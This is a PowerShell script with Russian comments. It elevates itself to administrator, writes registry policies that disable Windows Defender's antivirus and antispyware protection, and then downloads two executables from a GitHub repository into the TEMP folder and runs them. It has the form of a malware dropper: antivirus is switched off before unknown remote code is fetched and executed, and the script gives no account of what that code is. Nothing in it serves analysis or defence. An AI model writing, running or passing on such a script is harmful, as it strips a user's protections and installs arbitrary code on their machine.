Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)

if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { $workingDirOverride = (Get-Location).Path }

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
    if ($shouldAssumeToBeElevated) {
        Write-Output "Elevating did not work :("
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Set-Location "$workingDirOverride"

# 1. ОТКЛЮЧЕНИЕ DEFENDER
Write-Host "=== Disabling Windows Defender ===" -ForegroundColor Yellow

$DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$RealTimeProtectionKey = "Real-Time Protection"

if (!(Test-Path $DefenderPath)) { New-Item -Path $DefenderPath -Force }
New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force

New-ItemProperty -Path "$DefenderPath" -Name "DisableAntiSpyware" -Value "1" -PropertyType Dword -Force
New-ItemProperty -Path "$DefenderPath" -Name "DisableAntiVirus" -Value "1" -PropertyType Dword -Force

Write-Host "Windows Defender DISABLED" -ForegroundColor Green

# 2. СКАЧИВАНИЕ И ЗАПУСК ФАЙЛОВ
Write-Host ""
Write-Host "=== Downloading and Running Files ===" -ForegroundColor Yellow

$temp = $env:TEMP
$downloaded = 0

# Функция скачивания через BITS (работает всегда, даже через плохой интернет)
function Download-File {
    param($url, $dest)
    try {
        Write-Host "Downloading from: $url" -ForegroundColor Gray
        Start-BitsTransfer -Source $url -Destination $dest -Priority High -ErrorAction Stop
        return $true
    } catch {
        Write-Host "BITS failed, trying alternative..." -ForegroundColor DarkYellow
        try {
            # Альтернатива: Invoke-WebRequest
            Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing -ErrorAction Stop
            return $true
        } catch {
            return $false
        }
    }
}

# Первый файл
$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
$dest1 = "$temp\proga1.exe"

Write-Host "`n[1/2] Downloading proga1.exe..." -ForegroundColor Cyan
if (Download-File $url1 $dest1) {
    Write-Host "SUCCESS: proga1.exe downloaded" -ForegroundColor Green
    $downloaded++
} else {
    Write-Host "FAILED: proga1.exe" -ForegroundColor Red
}

# Второй файл
$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
$dest2 = "$temp\proga2.exe"

Write-Host "`n[2/2] Downloading proga2.exe..." -ForegroundColor Cyan
if (Download-File $url2 $dest2) {
    Write-Host "SUCCESS: proga2.exe downloaded" -ForegroundColor Green
    $downloaded++
} else {
    Write-Host "WARNING: proga2.exe not found, using copy of proga1.exe" -ForegroundColor Yellow
    if (Test-Path $dest1) {
        Copy-Item $dest1 $dest2 -Force
        Write-Host "Created proga2.exe from proga1.exe" -ForegroundColor Green
    } else {
        Write-Host "ERROR: Cannot create proga2.exe" -ForegroundColor Red
    }
}

# 3. ЗАПУСК ФАЙЛОВ
Write-Host ""
Write-Host "=== Running Files ===" -ForegroundColor Yellow

if (Test-Path $dest1) {
    Write-Host "Starting proga1.exe..." -ForegroundColor Green
    Start-Process -FilePath $dest1
} else {
    Write-Host "proga1.exe not found!" -ForegroundColor Red
}

if (Test-Path $dest2) {
    Write-Host "Starting proga2.exe..." -ForegroundColor Green
    Start-Process -FilePath $dest2
} else {
    Write-Host "proga2.exe not found!" -ForegroundColor Red
}

Write-Host ""
Write-Host "=== ALL DONE ($downloaded/2 files downloaded) ===" -ForegroundColor Green
Write-Host ""

Write-Host "Press any key to exit..." -ForegroundColor Gray
pause
